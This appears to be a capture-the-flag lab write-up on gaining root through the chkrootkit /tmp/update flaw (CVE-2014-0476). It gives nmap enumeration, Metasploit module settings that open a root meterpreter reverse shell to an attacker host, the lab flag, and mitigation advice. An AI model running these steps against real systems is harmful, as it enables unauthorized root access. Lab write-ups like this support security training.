
# 🚩 Exploiting Chkrootkit for Root Privilege Escalation

## 📌 Lab: Rootkit Workspace

Target: `192.137.220.3`
Attack Machine: Kali Linux (Metasploit Framework)

---

## 🔍 Enumeration with Nmap

We first enumerate the target machine using `db_nmap`:

```bash
msf6 > db_nmap -sV -Pn -sC -O 192.137.220.3
```

**Findings:**

* Port **22 (SSH)** open → OpenSSH 7.6p1 Ubuntu
* OS: Ubuntu Linux

---

## 👤 Initial Access

We obtained a low-privilege shell as user **jackie** via SSH.
Processes running show **chkrootkit** being executed regularly by root:

```bash
ps aux | grep chkrootkit
```

We discovered a suspicious script `/bin/check-down`:

```bash
cat /bin/check-down
```

It runs `chkrootkit` in a loop.

---

## ⚠️ Vulnerability: Chkrootkit (CVE-2014-0476)

* **chkrootkit** versions **< 0.50** contain a vulnerability.
* If a file named `/tmp/update` exists, chkrootkit will execute it **as root** during scans.
* This allows any local user to escalate privileges by writing a malicious executable/script to `/tmp/update`.
* Since `chkrootkit` is often run by **cron jobs** (every 10 or 15 minutes), the payload will eventually get executed automatically.

**References:**

* [NVD - CVE-2014-0476](https://nvd.nist.gov/vuln/detail/CVE-2014-0476)
* [Exploit-DB 33899](https://www.exploit-db.com/exploits/33899)

---

## 🎯 Exploitation with Metasploit

We use the Metasploit module:

```bash
use exploit/unix/local/chkrootkit
set CHKROOTKIT /usr/local/bin/chkrootkit/chkrootkit
set SESSION 1
set LHOST 192.137.220.2
set LPORT 4444
run
```

**What happens:**

* Module drops a payload into `/tmp/update`.
* Waits for `chkrootkit` to run (via cron).
* When executed by root, it spawns a **meterpreter session** as root.

---

## ✅ Privilege Escalation Success

```bash
meterpreter > getuid
Server username: root
```

We now have full root privileges.

---

## 🎁 Loot

Inside `/root`, we find the flag:

```bash
meterpreter > ls
meterpreter > cat flag
9db8bf8f483ff50857f26f9bd636bed6
```

---

## 📝 Key Takeaways

* Always check for **local privilege escalation vectors** once you gain a low-priv shell.
* `chkrootkit` < 0.50 is a **classic Linux privesc vulnerability**.
* Look for scheduled cron jobs or processes that run with elevated privileges.
* Mitigation: Upgrade chkrootkit, use file integrity monitoring, and restrict writable directories like `/tmp`.

---

⚡ **Final Root Flag:** `9db8bf8f483ff50857f26f9bd636bed6`
